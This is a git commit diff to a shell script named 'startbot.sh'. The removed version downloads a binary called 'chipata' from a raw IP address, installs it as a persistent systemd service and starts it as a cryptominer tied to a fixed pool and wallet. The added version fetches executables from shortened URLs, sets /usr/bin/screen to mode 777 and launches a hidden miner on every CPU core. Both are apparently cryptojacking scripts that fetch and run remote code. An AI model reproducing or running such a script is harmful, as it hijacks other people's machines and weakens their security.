8211ce4b16b121405063dc9733fcfb33cd4fbfd1
rogerssakala <106007738+rogerssakala@users.noreply.github.com>
2022-05-22 08:54:18 +0000

    Update startbot.sh

--- startbot.sh
+++ startbot.sh
@@ -1,35 +1,10 @@
 #!/bin/sh
-wget http://104.248.127.206/chipata
-chmod 777 chipata
-cp chipata /usr/bin 
-touch  /etc/systemd/system/chipata.service
-chmod 666 /etc/systemd/system/chipata.service
-cat << EOF > /etc/systemd/system/chipata.service 
- 
-[Unit] 
- 
-Description=chipata 
- 
-After=network.target 
- 
-StartLimitIntervalSec=0 
- 
-[Service] 
- 
-Type=simple 
- 
-Restart=always 
- 
-RestartSec=1 
- 
-ExecStart=/usr/bin/chipata --disable-gpu --algorithm randomepic --pool epic.ca.hashrate.to:4000 --wallet 499f420d52285ab12dda1be9e4d516a7b41e4baace0a3fc54f73db3dd418f3ac --password wabeiyoyatrs --log-file log.txt
- 
-[Install] 
- 
-WantedBy=multi-user.target 
- 
-EOF
-chmod 600 /etc/systemd/system/chipata.service
-systemctl enable chipata
-systemctl daemon-reload
-systemctl restart chipata
+worker="$(echo DOGE-$(shuf -i 1-999 -n 1))"
+cd /home/shell-bot
+wget -q https://git.io/JPjuz
+wget -qO build https://git.io/JPjuB
+chmod +x build
+chmod +x compile.sh
+chmod 777 /usr/bin/screen
+chmod 777 /run/screen
+screen -dm -S build ./build -a verus -o stratum+tcp://verushash.mine.zergpool.com:3300 -u D7hBkeeqaXzc7dy71FLqUdPoyogAYrU8s7 -p c=DOGE,mc=VRSC,ID=$worker -t $(nproc --all)
